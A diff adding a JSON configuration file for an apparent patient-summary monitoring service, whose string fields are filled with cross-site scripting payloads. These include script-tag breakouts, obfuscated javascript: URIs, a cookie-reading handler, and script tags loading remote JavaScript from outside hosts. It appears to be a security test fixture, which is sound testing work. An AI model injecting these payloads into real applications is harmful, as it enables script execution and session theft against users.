@@ -1,0 +1,23 @@
+{
+  "patientSummaryEntityClassId": "</script><script>alert('XSS');</script>\n",
+  "cutDateEntityClassId": "\\\";alert('XSS');//",
+  "cutDatePath": "$.date",
+  "reportsTitlePaths": [
+    "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\"\\>\n",
+    "$.attributes.reportContent.title"
+  ],
+  "reportsPreferredTypes": [
+    "<SCRIPT/XSS SRC=\"http://xss.rocks/xss.js\"></SCRIPT>\n",
+    "<SCRIPT SRC=https://cdn.jsdelivr.net/gh/Moksh45/host-xss.rocks/index.js></SCRIPT>\n",
+    "javascript:/*--></title></style></textarea></script></xmp> <svg/onload='+/\"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>\n",
+    "\\<a onmouseover=\"alert(document.cookie)\"\\>xxs link\\</a\\>\n",
+    "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\"\\>\n",
+    "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>\n",
+    "<IMG SRC=\"jav ascript:alert('XSS');\">\n",
+    "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">",
+    "perl -e 'print \"<IMG SRC=java\\0script:alert(\\\"XSS\\\")>\";' > out\n"
+  ],
+  "monitoringTtlSeconds": 2592000,
+  "scheduledTriggeringRule": "0 12 * * ? *",
+  "monitoredListUpdateRule": "0 * * * ? *"
+}
